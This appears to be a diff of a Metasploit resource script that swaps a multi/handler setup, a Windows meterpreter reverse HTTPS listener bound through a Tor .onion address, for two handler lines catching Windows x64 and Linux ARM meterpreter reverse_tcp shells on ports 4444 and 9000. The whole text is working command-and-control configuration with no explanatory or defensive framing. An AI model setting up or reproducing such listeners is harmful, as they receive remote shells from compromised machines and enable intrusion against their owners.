@@ -1,8 +1,2 @@
-use exploit/multi/handler 
-set payload windows/aarch64/meterpreter_reverse_https
-set lhost 0.0.0.0
-set lport 8445
-set reversehandlerbindaddress lwjqdmdzdq6ub3kz.onion
-set reversehandlerbindport 8443
-set exitonsession false
-run -j
+handler -H 0.0.0.0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
+handler -H 0.0.0.0 -P 9000 -p linux/armle/meterpreter/reverse_tcp
